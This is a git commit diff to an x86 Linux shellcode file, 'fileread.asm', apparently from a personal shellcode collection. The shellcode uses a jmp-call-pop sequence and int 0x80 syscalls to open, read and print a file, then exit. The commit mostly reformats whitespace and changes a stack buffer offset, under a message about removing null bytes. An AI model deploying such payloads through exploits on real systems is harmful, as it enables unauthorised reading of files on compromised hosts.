038554f172e443036f807008e4eae32856dd0a56
mishrasunny174 <mishrasunny174@gmail.com>
2019-06-11 12:23:14 +0530

    removed all the null bytes

--- x86/shellcodes/fileread.asm
+++ x86/shellcodes/fileread.asm
@@ -2,30 +2,30 @@ section .text
 global _start
 
 _start:
-	xor	eax,	eax
-	xor	ebx,	ebx
-	xor	ecx,	ecx
-	xor	edx,	edx
+	xor	eax,eax
+	xor	ebx,ebx
+	xor	ecx,ecx
+	xor	edx,edx
 	jmp 	short	_filename
 _filename_loaded:
 	mov	al,	0x5
 	pop	ebx
-	int 	0x80
-	mov	ebx,	eax
+	int 0x80
+	mov	ebx,eax
 	mov	al,	0x3
 	mov	al,	0x3
-	lea	ecx,	[esp+0xff]
+	lea	ecx,[esp-0xff]
 	mov	dl,	0xff
-	int 	0x80
-	xor	eax,	eax
+	int 0x80
+	xor	eax,eax
 	mov	al,	0x4
 	mov	bl,	0x1
-	lea	ecx,	[esp+0xff]
+	lea	ecx,[esp-0xff]
 	mov	dl,	0xff
-	int 	0x80
+	int 0x80
 	mov	al,	0x1
-	xor	ebx,	ebx
-	int 	0x80
+	xor	ebx,ebx
+	int 0x80
 
 _filename:
 	call	_filename_loaded
